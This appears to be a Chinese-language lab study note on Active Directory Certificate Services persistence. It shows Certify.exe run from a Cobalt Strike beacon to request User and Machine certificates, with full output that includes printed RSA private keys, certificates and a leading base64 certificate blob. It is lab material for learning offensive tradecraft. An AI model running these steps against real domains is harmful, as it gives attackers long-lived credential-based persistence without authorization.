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
```



# User & Computer Persistence

## 用户持久性

假设现在有一个DA的beacon

```
beacon> getuid
[*] You are DEV\nlamb
```


查找模板

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /clientauth
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660523683784.png)

需要留意的信息

有效期为1年。
不需要授权。
DEV 中的域用户具有注册权限。


申请证书

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
```

返回
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
[*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
[+] host called home, sent: 279703 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[+] received output:

[*] Current user context    : DEV\nlamb

[+] received output:
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io

[+] received output:

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\ca-2

[+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 6

[+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA5DEzZpRr17UlwRvzkQG6C/yKrUKXFKTX+PaQ5MfcvDus0MRu
vTnhRXMbX6Y+2ohJ8iGDU3crrK4vbLBOP0FOV7jWMt50dKiBsqLbpFtJh6L/tNhU
M9JM3rUbQaGxCsF0aFfN2QbigXHYFcpAnkjKXbjKCJ44DWmCK7MkDJZUrqYs3nB8
+t8RazUI3RXEC3wl0a/Gu8qViqoRubG7W3VC5Xohq7WLQ1PwMMVOqNLoHly6VZSF
B0+8+/aRXKh+IMUQNhsbvcE+h/5GJrDjL3hVbG5eHtpYb3sQrNjmprOVN841Y80O
KT5+rh/07RF8Y79AnsYVcKvvMcUIed3tL7GTeQIDAQABAoIBADTF7inAlIo/8hnN
cZBtEk5YWugD+PXEw8/nkg3e7P05XdewPh4UBzWtD70YsPuQPm25c2o3qsmWRRCB
W69EVq5x6FO+X7dlCw25nUtO81vjhfiYeSy865srzkBo+Q1QPTAuckRJU9P09LDh
Y/1XPznalRrWIId1ia26kdE5aR80jmuPBBzSdRqLtacFhdWWKyLlpsi0chXPXTrn
AJGbBW5ZekK7GR25zYaBi3hyWgO35NkdEU+qFcLrxjqg8sn661a/SvQDLDl0+iKM
YB8GRYGS93LCK8sfPJqVPgTrqog2vRyqX3aXT1SUaSb/RXIAunz2yjRNoWWHC7pL
X1PnL0sCgYEA8VdP+RPcpBXN8ABHDYEUDsl9XCxVsKWDBCAjJ+su/z6wBe6SV4zh
xQ/KAg/dgxJWiIapzXipRLIeRcYkBoYcmnyMA+pPOYaMcMcJpP+G7IFbBQcR8tFX
oa7ifnLL6prXZEtWqraABBmDIiv+BH1BczveQJqPo5ynHqpuPxJgTQ8CgYEA8g1u
tOd/hNp+ftfWto5B8GtbGi5iJA14jIBtsNN8xw2LRifYY2w2vl/fPHNLv20yS10G
qd0VMkkxqyOKjJVRMKPekVJ8FzhEg88sGav8/NsW2A33qfoSlN81Jz9wIAmbeeih
BIzEgpJR4ogL+FBS8WS98LQ7KL5HowiZqu85JvcCgYBiZKV/OADJiPY39fUB5XEn
AjCwxoZ9CU2b/fo3SSQU/hrHoFdbiF13eRNzucImsPBEoxpRYfMoxbGf4sNHQaAh
v8tZwUpheqCBTjR5Z5A7lhVkvFgt9flTOriusuC+Gjjcc/a2jMcuZLRY1zSt4d8w
OuVG03ziSHi+AOAHqNdIMwKBgGnXR85g39jG9cMfPCsNX3Xya56yI4XiQhEl41EL
2SbtHDZsG+m1muZ545J6U+f7pp9fqRdDrg4UBVzxKJc6f4sGTL880zgQCZ2dTIpZ
M0GZx45n5SD1UYS5aXOlALFxogOXnjjwGMmDk7y7gohtDyewxoFnPesd8RMwIoml
G1eXAoGAM4n4EBLiyThP6dYkHC3SoNMLsfCYbvBQJPhT4oDUqLboF9vaGYTZvphJ
aRWiErNsIdcpfCFY+kmZHhuTPgi7gftkcDU4NZcWQFmbYlbgqbivCKQ2QvVyDy3u
iluIboqyDmYR4CMQa1uqIfaweYjMeOuCTEbmt+hqPzZCbLNlEeQ=
-----END RSA PRIVATE KEY-----

[+] received output:
-----BEGIN CERTIFICATE-----
MIIGFzCCBP+gAwIBAgITKQAAAAbQAYVGEpzaIwAAAAAABjANBgkqhkiG9w0BAQsF
ADBUMRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMRMwEQYKCZImiZPyLGQBGRYDZGV2MQ0wCwYDVQQDEwRjYS0yMB4XDTIyMDgx
NTAwMjU0OFoXDTIzMDgxNTAwMjU0OFowgY0xEjAQBgoJkiaJk/IsZAEZFgJpbzEa
MBgGCgmSJomT8ixkARkWCmN5YmVyYm90aWMxEzARBgoJkiaJk/IsZAEZFgNkZXYx
DjAMBgNVBAMTBVVzZXJzMRIwEAYDVQQDEwlOaW5hIExhbWIxIjAgBgkqhkiG9w0B
CQEWE25sYW1iQGN5YmVyYm90aWMuaW8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDkMTNmlGvXtSXBG/ORAboL/IqtQpcUpNf49pDkx9y8O6zQxG69OeFF
cxtfpj7aiEnyIYNTdyusri9ssE4/QU5XuNYy3nR0qIGyotukW0mHov+02FQz0kze
tRtBobEKwXRoV83ZBuKBcdgVykCeSMpduMoInjgNaYIrsyQMllSupizecHz63xFr
NQjdFcQLfCXRr8a7ypWKqhG5sbtbdULleiGrtYtDU/AwxU6o0ugeXLpVlIUHT7z7
9pFcqH4gxRA2Gxu9wT6H/kYmsOMveFVsbl4e2lhvexCs2Oams5U3zjVjzQ4pPn6u
H/TtEXxjv0CexhVwq+8xxQh53e0vsZN5AgMBAAGjggKmMIICojAXBgkrBgEEAYI3
FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYKKwYBBAGCNwoDBAYIKwYBBQUHAwQG
CCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqG
SIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcw
HQYDVR0OBBYEFKtN11hDPpAMJBlM6/6s3ZfK6Ze7MB8GA1UdIwQYMBaAFETxugZf
UJBhM0s7xNzEgBrr+oF2MIHBBgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8v
L0NOPWNhLTIsQ049ZGMtMixDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGljLERD
PWlvP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
UkxEaXN0cmlidXRpb25Qb2ludDCBuAYIKwYBBQUHAQEEgaswgagwgaUGCCsGAQUF
BzAChoGYbGRhcDovLy9DTj1jYS0yLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVyYm90
aWMsREM9aW8/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
YXRpb25BdXRob3JpdHkwRwYDVR0RBEAwPqAnBgorBgEEAYI3FAIDoBkMF25sYW1i
QGRldi5jeWJlcmJvdGljLmlvgRNubGFtYkBjeWJlcmJvdGljLmlvMA0GCSqGSIb3
DQEBCwUAA4IBAQCC9209hQWYYQjsn0J71DhtR8FoqSnErJYcAt3YhpUvFyByYLQi
8CW2MdUKCCFmogFf+2vX/LhTEPSEsdAb2mYJHPVz3fSKCVZtR69gTp9JwVURVT9U
opHvBsAuDNWNaEn7D68LtfxowNhhdGwziv8dzclwW2iVK4BwjaGHBumTKfU3r8n2
XAcXOVsjvjbUh2xWu8IjYbDjy9bJITqeT6u/T8dmqgUd7ymVRtEhrUJYBBY8i411
agApuNL9iZJHZaf8LI3viCwOEt+3bHPjMAHYS16gGTv5S+uzP9IzGz/0kHrIsTEK
bjrPo6ljmympgFwja7ohr/2V3dXY0wqopUJU
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:17.3343555

```

申请到上面的证书以后，按照前几节的方法利用。

## 计算机持久性

> 这种情况与上面的情况并没有什么不同。机器是 AD 中的一种特殊类型的用户，可以拥有自己的证书。计算机的默认模板称为Machine（模板显示名称为Computer）。默认情况下，它们的有效期也是 1 年，不需要授权，并且所有域计算机都具有注册权限。

**注意，这里的操作需要system权限**



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660524157612.png)

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
[*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
[+] host called home, sent: 279727 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[+] received output:

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : Machine
[*] Subject                 : CN=srv-1.dev.cyberbotic.io

[+] received output:

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\ca-2

[+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 7

[+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzrSorSn9dltk/+KkSagtV7y6HP8JD5dbZe1qwjYhK8T1EWNp
SD3YDTHhi8/gJ1qg1R2f55/dKM1+RKF76SyGA/xUhQ4TODcaMIy9IgJYQa3peEZq
buvqv0lY5vXRRR982hlqLca5gEYlLEsg0g5GMnYTAaOf4kGlrrmTq9b7xngThIi5
5/sxOd15DD99KkPRTYB0VEVu2YD+xeE3YrCfC9djfKUBYEz3uiF8QuNt02Ew0+0H
lMd6NqMyTFYkC9cMFNgnaBeKJmwvX2+Krs6ERBPFUTLp6R4zHxTy7imBqdIWhmKX
LA8YgsEhQh+M0h2M0/KEmnecIvlLkqXUM/RnBQIDAQABAoIBABQg0/cOynNyyWZA
feJ9SbMMOexWal22Dayifp2cU0UVmA6iKU+jVA1O4OlyK9/xK42tJZPSxaCyR/wr
ZGtLjl5HfTx6pyT3eqmlHsq3wzvcEUrIwpb8Cp8nZ4yP/dmXDBuZ03TTL9+dlQOX
6kGCKdRCmq2zbv+DiHx37jkSxXApNsAmHf6VbCkVqebEqGexb5Pr5YLJ8BKx0SMJ
V4MLer/mdGzdEb+6KsuJjPVeb1/cAOQ7Rv26oqSfAVjr2W6Dn45HSdHVijr+eje6
M9qxnwQa2V2O2YVd5uIbiCQmAffI3Y42AlrtVb5Fo2WP06Mdb8pC3GgjR5VXD3Je
Sj5ZCEkCgYEA+H5ZneDa1+zgKlifZuDM9Vso/k90k5jzXIpny+gxXtd+1boXyVHB
pHV5g3zgfx4+yTxvN5qyDCupXIWW1q1gAL0xJTpBSHsg/AFaUv7QfuMQMO+/kNGi
tTlxJvFb6KLK44KpG/gePsEsGw43xeb9UuPUk7DfBf5ixy3qKCa7kl0CgYEA1PMn
sU4zzfaPX9+UC7kJ8A9JAzQ5G/iuxmQr0564gJU2xj+RfyXNzc83qWPtD3L7CtkP
yi4bZFhPfZZ7VZPvb0+3SoAY3Sav8xDizO1btbPlTfGK+OOEbWEqXE/VfFBal+3j
wlkrXFMAZMZA9qB4VNOjxBWvLpznweG1wsA4rMkCgYEAq6XrlYj64mh3uAibo17p
dRpRSMntxv7CLExWwp1TbSYCMPRo9eGJl2amV1NtZ6Gm0S7zzD8Jeiq2xHhq50O/
qwME7ag97ClRcYIluGrX7q4+Qu95LjoA4JobNUFHsXyyFVHuKqnLiqG5K784e3XB
yv4hmxt0ExnTda6brryCmOkCgYB2Y3R2w2ZTpDbTc0YoOkhHGQhbaqYxYdEw5LHk
5cHnYo1gLCkkigzf1cs5Nh+uThs5TbHUkkuSPvJ6fLW2vxcHSEc7ePnZwU9ij8m3
amJpI0lhSt8bPcn60WEujwe+JCIpgwzzmIVdv5tha0LkmhQr/Ll4IyIQhRTnmidl
zV302QKBgDjrVvq5nHGD0LjpM7WZoIPPVuVqaJVW0skAYHqVpqstgfwDkGWO6q12
qAeeLobyF7G4mOvRgKM++9OIyInWUdJvaEmBgIuLciyzvKTDzyZd2Oc6bScCwFmn
z0BA4ofdsKW9EBvdc0qJKSlSdLSnalymG5rF48lnCS17r2B3Wkhz
-----END RSA PRIVATE KEY-----

[+] received output:
-----BEGIN CERTIFICATE-----
MIIFOjCCBCKgAwIBAgITKQAAAAe7Tf5t8lbJhAAAAAAABzANBgkqhkiG9w0BAQsF
ADBUMRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMRMwEQYKCZImiZPyLGQBGRYDZGV2MQ0wCwYDVQQDEwRjYS0yMB4XDTIyMDgx
NTAwMzEyOVoXDTIzMDgxNTAwMzEyOVowIjEgMB4GA1UEAxMXc3J2LTEuZGV2LmN5
YmVyYm90aWMuaW8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDOtKit
Kf12W2T/4qRJqC1XvLoc/wkPl1tl7WrCNiErxPURY2lIPdgNMeGLz+AnWqDVHZ/n
n90ozX5EoXvpLIYD/FSFDhM4NxowjL0iAlhBrel4Rmpu6+q/SVjm9dFFH3zaGWot
xrmARiUsSyDSDkYydhMBo5/iQaWuuZOr1vvGeBOEiLnn+zE53XkMP30qQ9FNgHRU
RW7ZgP7F4TdisJ8L12N8pQFgTPe6IXxC423TYTDT7QeUx3o2ozJMViQL1wwU2Cdo
F4ombC9fb4quzoREE8VRMunpHjMfFPLuKYGp0haGYpcsDxiCwSFCH4zSHYzT8oSa
d5wi+UuSpdQz9GcFAgMBAAGjggI1MIICMTAdBgkrBgEEAYI3FAIEEB4OAE0AYQBj
AGgAaQBuAGUwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB
/wQEAwIFoDAdBgNVHQ4EFgQUK8NTUaQatlWElFzZgcD1Jn7CNx8wHwYDVR0jBBgw
FoAURPG6Bl9QkGEzSzvE3MSAGuv6gXYwgcEGA1UdHwSBuTCBtjCBs6CBsKCBrYaB
qmxkYXA6Ly8vQ049Y2EtMixDTj1kYy0yLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVy
Ym90aWMsREM9aW8/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG4BggrBgEFBQcBAQSBqzCBqDCB
pQYIKwYBBQUHMAKGgZhsZGFwOi8vL0NOPWNhLTIsQ049QUlBLENOPVB1YmxpYyUy
MEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9
Y3liZXJib3RpYyxEQz1pbz9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAiBgNVHREEGzAZghdzcnYtMS5kZXYuY3li
ZXJib3RpYy5pbzANBgkqhkiG9w0BAQsFAAOCAQEAFsp729KMD02+cDeTr1xlstU/
+q/RPAWLye4lytYeukajrgkEOfhm0od1oB0r+wGsASb6/5ScRoOWTlNEyYg2lDTh
vhzzX92wUfvyIJBo9t4UWPrBbQV0Z9R+ndgT6N77S85XiUh1taHBaaB7nsq8JJgI
moqivYEMA0eQTdDIPPDvCckcQUA7M4SHiVjnGGMQ0tjYSeFaZjwwIZoBuDgHePMP
VqELtIUljHTRweEGYQBjknFscwngSbyccRNC3U2X3yqoDPezm0MXdZQGuyzpjLou
O0ZlAuHbLV1GxIDzrZFqieWAIt75azBKm5MaRNIMYKeATXjfSB52Nd9jfNbxrQ==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:16.4998413

```